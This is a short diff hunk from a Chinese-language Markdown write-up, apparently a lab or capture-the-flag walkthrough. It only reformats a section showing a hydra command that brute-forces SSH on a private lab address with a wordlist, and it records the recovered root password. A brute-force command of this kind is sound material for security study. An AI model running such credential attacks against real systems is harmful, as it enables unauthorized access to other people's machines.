@@ -472,10 +472,8 @@ Root1
 
 ### 4.2使用hydra对SSH服务进行爆破
 
-使用hydra对192.168.1.7 SSH服务进行爆破`hydra -L /root/桌面/wordlist.txt -P /root/桌面/wordlist.txt -t 6 ssh://192.168.1.7 #-t将线程调低为了保证稳定性`
-
-![](../.gitbook/assets/hydra.png)
-
+使用hydra对192.168.1.7 SSH服务进行爆破`hydra -L /root/桌面/wordlist.txt -P /root/桌面/wordlist.txt -t 6 ssh://192.168.1.7 #-t将线程调低为了保证稳定性`  
+![](../.gitbook/assets/hydra.png)  
 得到服务器的root账户的口令root:roottoor，ssh连接为root权限
 
 ```go
